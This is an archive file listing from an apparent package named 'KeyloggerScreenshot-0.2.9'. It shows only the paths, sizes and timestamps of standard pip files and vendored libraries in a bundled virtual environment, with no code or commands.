--rw-rw-rw-   0        0        0     1193 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/models.py
--rw-rw-rw-   0        0        0     2108 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/packaging.py
--rw-rw-rw-   0        0        0     5662 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/setuptools_build.py
--rw-rw-rw-   0        0        0     9197 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/subprocess.py
--rw-rw-rw-   0        0        0     7702 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/temp_dir.py
--rw-rw-rw-   0        0        0     8821 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/unpacking.py
--rw-rw-rw-   0        0        0     1759 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/urls.py
--rw-rw-rw-   0        0        0     3459 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/virtualenv.py
--rw-rw-rw-   0        0        0     4549 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/wheel.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:34.113432 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/vcs/
--rw-rw-rw-   0        0        0      596 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/vcs/__init__.py
--rw-rw-rw-   0        0        0     3518 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/vcs/bazaar.py
--rw-rw-rw-   0        0        0    18116 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/vcs/git.py
--rw-rw-rw-   0        0        0     5238 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/vcs/mercurial.py
--rw-rw-rw-   0        0        0    11728 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/vcs/subversion.py
--rw-rw-rw-   0        0        0    22811 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/vcs/versioncontrol.py
--rw-rw-rw-   0        0        0    13079 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/wheel_builder.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:34.168162 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/
--rw-rw-rw-   0        0        0     4966 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:34.288236 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/
--rw-rw-rw-   0        0        0      465 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/__init__.py
--rw-rw-rw-   0        0        0     1379 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/_cmd.py
--rw-rw-rw-   0        0        0     5033 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/adapter.py
--rw-rw-rw-   0        0        0     1535 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/cache.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:34.328179 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/caches/
--rw-rw-rw-   0        0        0      242 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/caches/__init__.py
--rw-rw-rw-   0        0        0     5271 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/caches/file_cache.py
--rw-rw-rw-   0        0        0     1033 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/caches/redis_cache.py
--rw-rw-rw-   0        0        0      778 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/compat.py
--rw-rw-rw-   0        0        0    16416 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/controller.py
--rw-rw-rw-   0        0        0     3946 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/filewrapper.py
--rw-rw-rw-   0        0        0     4154 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/heuristics.py
--rw-rw-rw-   0        0        0     7105 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/serialize.py
--rw-rw-rw-   0        0        0      774 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/cachecontrol/wrapper.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:34.358496 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/certifi/
--rw-rw-rw-   0        0        0       94 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/certifi/__init__.py
--rw-rw-rw-   0        0        0      255 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/certifi/__main__.py
--rw-rw-rw-   0        0        0     4279 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/certifi/core.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:34.852000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/
--rw-rw-rw-   0        0        0     3705 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/__init__.py
--rw-rw-rw-   0        0        0    31274 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/big5freq.py
--rw-rw-rw-   0        0        0     1741 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/big5prober.py
--rw-rw-rw-   0        0        0     9608 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/chardistribution.py
--rw-rw-rw-   0        0        0     3817 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/charsetgroupprober.py
--rw-rw-rw-   0        0        0     4801 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/charsetprober.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:34.868207 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/cli/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/cli/__init__.py
--rw-rw-rw-   0        0        0     2406 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/cli/chardetect.py
--rw-rw-rw-   0        0        0     3559 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/codingstatemachine.py
--rw-rw-rw-   0        0        0     1838 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/cp949prober.py
--rw-rw-rw-   0        0        0     1619 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/enums.py
--rw-rw-rw-   0        0        0     3864 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/escprober.py
--rw-rw-rw-   0        0        0    12021 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/escsm.py
--rw-rw-rw-   0        0        0     3676 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/eucjpprober.py
--rw-rw-rw-   0        0        0    13566 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/euckrfreq.py
--rw-rw-rw-   0        0        0     1731 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/euckrprober.py
--rw-rw-rw-   0        0        0    36913 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/euctwfreq.py
--rw-rw-rw-   0        0        0     1731 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/euctwprober.py
--rw-rw-rw-   0        0        0    20735 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/gb2312freq.py
--rw-rw-rw-   0        0        0     1737 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/gb2312prober.py
--rw-rw-rw-   0        0        0    13919 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/hebrewprober.py
--rw-rw-rw-   0        0        0    25796 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/jisfreq.py
--rw-rw-rw-   0        0        0    42498 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/johabfreq.py
--rw-rw-rw-   0        0        0     1730 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/johabprober.py
--rw-rw-rw-   0        0        0    26797 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/jpcntx.py
--rw-rw-rw-   0        0        0   104562 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/langbulgarianmodel.py
--rw-rw-rw-   0        0        0    98484 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/langgreekmodel.py
--rw-rw-rw-   0        0        0    98196 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/langhebrewmodel.py
--rw-rw-rw-   0        0        0   101363 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/langhungarianmodel.py
--rw-rw-rw-   0        0        0   128035 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/langrussianmodel.py
--rw-rw-rw-   0        0        0   102774 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/langthaimodel.py
--rw-rw-rw-   0        0        0    95372 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/langturkishmodel.py
--rw-rw-rw-   0        0        0     5260 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/latin1prober.py
--rw-rw-rw-   0        0        0     3367 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/mbcharsetprober.py
--rw-rw-rw-   0        0        0     2056 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/mbcsgroupprober.py
--rw-rw-rw-   0        0        0    30068 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/mbcssm.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:34.878404 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/metadata/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/metadata/__init__.py
--rw-rw-rw-   0        0        0    13280 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/metadata/languages.py
--rw-rw-rw-   0        0        0     6199 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/sbcharsetprober.py
--rw-rw-rw-   0        0        0     4129 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/sbcsgroupprober.py
--rw-rw-rw-   0        0        0     3749 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/sjisprober.py
--rw-rw-rw-   0        0        0    13288 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/universaldetector.py
--rw-rw-rw-   0        0        0     8289 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/utf1632prober.py
--rw-rw-rw-   0        0        0     2709 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/utf8prober.py
--rw-rw-rw-   0        0        0      242 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/chardet/version.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:34.950086 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/colorama/
--rw-rw-rw-   0        0        0      239 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/colorama/__init__.py
--rw-rw-rw-   0        0        0     2522 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/colorama/ansi.py
--rw-rw-rw-   0        0        0    10830 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/colorama/ansitowin32.py
--rw-rw-rw-   0        0        0     1915 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/colorama/initialise.py
--rw-rw-rw-   0        0        0     5404 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/colorama/win32.py
--rw-rw-rw-   0        0        0     6438 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/colorama/winterm.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:35.120287 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distlib/
--rw-rw-rw-   0        0        0      581 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distlib/__init__.py
--rw-rw-rw-   0        0        0    41259 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distlib/compat.py
--rw-rw-rw-   0        0        0    51697 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distlib/database.py
--rw-rw-rw-   0        0        0    20834 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distlib/index.py
--rw-rw-rw-   0        0        0    51991 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distlib/locators.py
--rw-rw-rw-   0        0        0    14811 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distlib/manifest.py
--rw-rw-rw-   0        0        0     5058 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distlib/markers.py
--rw-rw-rw-   0        0        0    39801 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distlib/metadata.py
--rw-rw-rw-   0        0        0    10820 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distlib/resources.py
--rw-rw-rw-   0        0        0    18102 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distlib/scripts.py
--rw-rw-rw-   0        0        0    66262 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distlib/util.py
--rw-rw-rw-   0        0        0    23513 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distlib/version.py
--rw-rw-rw-   0        0        0    43898 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distlib/wheel.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:35.158160 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distro/
--rw-rw-rw-   0        0        0      981 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distro/__init__.py
--rw-rw-rw-   0        0        0       64 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distro/__main__.py
--rw-rw-rw-   0        0        0    48841 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/distro/distro.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:35.253234 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/idna/
--rw-rw-rw-   0        0        0      849 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/idna/__init__.py
--rw-rw-rw-   0        0        0     3374 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/idna/codec.py
--rw-rw-rw-   0        0        0      321 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/idna/compat.py
--rw-rw-rw-   0        0        0    12950 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/idna/core.py
--rw-rw-rw-   0        0        0    44375 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/idna/idnadata.py
--rw-rw-rw-   0        0        0     1881 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/idna/intranges.py
--rw-rw-rw-   0        0        0       21 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/idna/package_data.py
--rw-rw-rw-   0        0        0   206539 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/idna/uts46data.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:35.303151 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/msgpack/
--rw-rw-rw-   0        0        0     1132 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/msgpack/__init__.py
--rw-rw-rw-   0        0        0     1081 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/msgpack/exceptions.py
--rw-rw-rw-   0        0        0     6080 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/msgpack/ext.py
--rw-rw-rw-   0        0        0    34557 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/msgpack/fallback.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:35.428273 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/packaging/
--rw-rw-rw-   0        0        0      661 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/packaging/__about__.py
--rw-rw-rw-   0        0        0      497 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/packaging/__init__.py
--rw-rw-rw-   0        0        0    11488 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/packaging/_manylinux.py
--rw-rw-rw-   0        0        0     4378 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/packaging/_musllinux.py
--rw-rw-rw-   0        0        0     1431 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/packaging/_structures.py
--rw-rw-rw-   0        0        0     8487 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/packaging/markers.py
--rw-rw-rw-   0        0        0     4676 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/packaging/requirements.py
--rw-rw-rw-   0        0        0    30110 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/packaging/specifiers.py
--rw-rw-rw-   0        0        0    15699 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/packaging/tags.py
--rw-rw-rw-   0        0        0     4200 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/packaging/utils.py
--rw-rw-rw-   0        0        0    14665 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/packaging/version.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:35.533199 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pep517/
--rw-rw-rw-   0        0        0      130 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pep517/__init__.py
--rw-rw-rw-   0        0        0      138 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pep517/_compat.py
--rw-rw-rw-   0        0        0     3443 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pep517/build.py
--rw-rw-rw-   0        0        0     6083 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pep517/check.py
--rw-rw-rw-   0        0        0     3994 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pep517/colorlog.py
--rw-rw-rw-   0        0        0      607 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pep517/dirtools.py
--rw-rw-rw-   0        0        0     6081 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pep517/envbuild.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:35.554200 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pep517/in_process/
--rw-rw-rw-   0        0        0      872 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pep517/in_process/__init__.py
--rw-rw-rw-   0        0        0    10801 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pep517/in_process/_in_process.py
--rw-rw-rw-   0        0        0     2520 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pep517/meta.py
--rw-rw-rw-   0        0        0    12721 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pep517/wrappers.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:35.583462 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pkg_resources/
--rw-rw-rw-   0        0        0   108287 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pkg_resources/__init__.py
--rw-rw-rw-   0        0        0      562 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pkg_resources/py31compat.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:35.678175 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/platformdirs/
--rw-rw-rw-   0        0        0    12831 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/platformdirs/__init__.py
--rw-rw-rw-   0        0        0     1176 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/platformdirs/__main__.py
--rw-rw-rw-   0        0        0     4068 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/platformdirs/android.py
--rw-rw-rw-   0        0        0     4910 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/platformdirs/api.py
--rw-rw-rw-   0        0        0     2655 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/platformdirs/macos.py
--rw-rw-rw-   0        0        0     6910 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/platformdirs/unix.py
--rw-rw-rw-   0        0        0       78 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/platformdirs/version.py
--rw-rw-rw-   0        0        0     6439 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/platformdirs/windows.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:35.878281 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/
--rw-rw-rw-   0        0        0     2999 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/__init__.py
--rw-rw-rw-   0        0        0      353 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/__main__.py
--rw-rw-rw-   0        0        0    23685 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/cmdline.py
--rw-rw-rw-   0        0        0     1697 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/console.py
--rw-rw-rw-   0        0        0     1938 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/filter.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:35.893199 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/filters/
--rw-rw-rw-   0        0        0    40386 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/filters/__init__.py
--rw-rw-rw-   0        0        0     2917 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/formatter.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:36.068149 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/formatters/
--rw-rw-rw-   0        0        0     4810 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/formatters/__init__.py
--rw-rw-rw-   0        0        0     4104 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/formatters/_mapping.py
--rw-rw-rw-   0        0        0     3314 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/formatters/bbcode.py
--rw-rw-rw-   0        0        0     5086 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/formatters/groff.py
--rw-rw-rw-   0        0        0    35441 2023-03-16 07:26:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/pygments/formatters/html.py
